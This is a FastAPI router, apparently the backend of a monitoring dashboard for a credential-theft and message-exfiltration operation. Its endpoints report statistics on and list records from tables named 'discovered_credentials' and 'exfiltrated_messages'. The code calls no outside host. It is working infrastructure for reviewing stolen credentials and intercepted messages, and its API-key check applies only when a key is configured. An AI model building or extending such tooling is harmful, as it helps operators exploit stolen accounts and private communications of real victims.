from fastapi import APIRouter, HTTPException, Query, Header
from typing import List
from app.core.database import db
from app.schemas.models import CredentialOut, MessageOut, StatsOut
from app.core.config import settings

router = APIRouter(prefix="/monitor", tags=["Monitor"])

async def _verify_monitor_auth(x_monitor_key: str | None = Header(None)):
    if settings.MONITOR_API_KEY:
        if x_monitor_key != settings.MONITOR_API_KEY:
            raise HTTPException(status_code=403, detail="Invalid or missing monitor API key")

@router.get("/stats", response_model=StatsOut)
async def get_stats(_auth: None = Header(None, alias="X-Monitor-Key")):
    """Get system stats. Requires MONITOR_API_KEY if configured."""
    if settings.MONITOR_API_KEY:
        if _auth != settings.MONITOR_API_KEY:
            raise HTTPException(status_code=403, detail="Invalid or missing monitor API key")
    try:
        # Supabase-py 'count' is tricky depending on version. 
        # Using exact=True if supported or just len(). For massive tables this is bad.
        # But this is "simple" request logic.
        
        c_res = db.table("discovered_credentials").select("*", count="exact").execute()
        total_creds = c_res.count if c_res.count is not None else len(c_res.data)
        
        ca_res = db.table("discovered_credentials").select("*", count="exact").eq("status", "active").execute()
        active_creds = ca_res.count if ca_res.count is not None else len(ca_res.data)

        m_res = db.table("exfiltrated_messages").select("*", count="exact").execute()
        total_msgs = m_res.count if m_res.count is not None else len(m_res.data)

        b_res = db.table("exfiltrated_messages").select("*", count="exact").eq("is_broadcasted", True).execute()
        bc_msgs = b_res.count if b_res.count is not None else len(b_res.data)

        return StatsOut(
            credentials_total=total_creds,
            credentials_active=active_creds,
            messages_exfiltrated=total_msgs,
            messages_broadcasted=bc_msgs
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/credentials", response_model=List[CredentialOut])
async def list_credentials(limit: int = 100, x_monitor_key: str | None = Header(None)):
    if settings.MONITOR_API_KEY:
        if x_monitor_key != settings.MONITOR_API_KEY:
            raise HTTPException(status_code=403, detail="Invalid or missing monitor API key")
    try:
        res = db.table("discovered_credentials").select("*").order("created_at", desc=True).limit(limit).execute()
        return res.data
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/messages", response_model=List[MessageOut])
async def list_messages(limit: int = 100, x_monitor_key: str | None = Header(None)):
    if settings.MONITOR_API_KEY:
        if x_monitor_key != settings.MONITOR_API_KEY:
            raise HTTPException(status_code=403, detail="Invalid or missing monitor API key")
    try:
        res = db.table("exfiltrated_messages").select("*").order("created_at", desc=True).limit(limit).execute()
        return res.data
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
